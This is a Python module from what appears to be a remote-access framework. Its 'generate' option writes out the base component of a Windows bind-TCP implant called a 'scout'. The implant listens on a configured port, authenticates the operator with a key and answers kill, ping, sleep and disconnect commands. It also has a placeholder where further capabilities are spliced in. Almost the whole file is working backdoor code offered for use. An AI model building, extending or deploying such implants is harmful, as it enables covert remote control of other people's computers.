# WEB + COM
# done
import library.modules.config as config
import library.modules.safe_open as safe_open
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify



def main(option):
    if option == 'generate':
        host = config.scout_values['Host'][0]
        port = config.scout_values['Port'][0]
        key = config.key
        timeout = config.scout_values['Timeout'][0]
        filepath = config.scout_values['Path'][0]
        config.import_statements.append('import socket')
        config.import_statements.append('from os import _exit')
        config.import_statements.append('from time import sleep')
        config.import_statements.append('import pickle')
        with safe_open.main(filepath, 'w') as f:
            f.write('''
def main_recv(sock):
    sock.settimeout(None)
    try:
        data = sock.recv(1000000)
        processed_data = data.decode()
        target_length = int(processed_data.split("|",1)[0])
        data = data[len(str(target_length))+1:]
    except UnicodeDecodeError:
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|",1)[0])
        data = data[len(str(target_length))+1:]

    received_data_length = len(data)
    if received_data_length >= target_length:
        try:
            return data.decode()
        except UnicodeDecodeError:
            return data

    sock.settimeout(3)
    while received_data_length < target_length:
        try:
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):
            break
    try:
        return data.decode()
    except UnicodeDecodeError:
        return data

def main_send(data, sock):
    try:
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError:
        sock.sendall(str(len(data)).encode() + b"|" + data)
''')
            if ',' in host:
                host = str(host.replace(' ', '').split(','))
                f.write('''
host_list = variable_host
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                sock = socket.socket()
                sock.settimeout(variable_timeout)
                sock.bind((i,variable_port))
                sock.listen(1)
                s, a = sock.accept()
                main_send('variable_key', s)
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
                    'variable_key', key))
            else:
                f.write('''
while True:
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(variable_timeout)
            sock.bind(('variable_host',variable_port))
            sock.listen(1)
            s, a = sock.accept()
            main_send('variable_key', s)
            break
        except (socket.timeout,socket.error):
            continue
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
                    'variable_key', key))
            f.write('''
    while True:
        try:
            data = main_recv(s)
            interface = data.split(' ')[0]
            if interface == "g":
                interface = "GUI"
            elif interface == "c":
                interface = "CUI"
            data = data.split(' ')[1:]
            command = ""
            for command_string in data:
                command = command + command_string + " "
            data = command.strip()
            command = data.split(" ")[0]
            if command == 'kill':
                main_send('[*]Scout is killing itself...', s)
                sleep(1)
                _exit(1)
            elif command in ('help','?'):
                if interface == "GUI":
                    main_send(pickle.dumps(comp_list), s)
                elif interface == "CUI":
                    main_send(help_menu, s)
            elif command == "help_command":
                main_send(help_menu, s)
            elif command == 'ping':
                main_send('[+]Scout is alive', s)
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                main_send('[*]Scout is sleeping...', s)
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                main_send('[*]Scout is disconnecting itself...', s)
                sleep(3)
                break#Statements#
            else:
                main_send('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)', s)
        except (socket.error,socket.timeout) as e:
            try:
                if type(e) not in (ConnectionResetError,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                main_send('[-]Please supply valid arguments for the command you are running', s)
            except Exception as e:
                main_send(('[!]Error in scout : ' + str(e)), s)
        except IndexError:
            main_send('[-]Please supply valid arguments for the command you are running', s)
        except Exception as e:
            main_send(('[!]Error in scout : ' + str(e)), s)''')
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Bind TCP Base component",
                "OS": "Windows",
                "Required Modules": "socket, time",
                "Commands": "kill, ping, sleep <time>, disconnect",
                "Description": "The base component of the scout, it hosts a server and allows the user to connect to it. It also supports connection status commands",
                "Connection Type": "Bind"}
        elif interface == "CUI":
            print('\nName             : Bind TCP Base component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : socket, time' \
                  '\nCommands         : kill, ping, sleep <time>, disconnect' \
                  '\nDescription      : The base component of the scout, it hosts a server and allows the user to connect to it. It also supports connection status commands' \
                  '\nConnection type  : Bind\n')
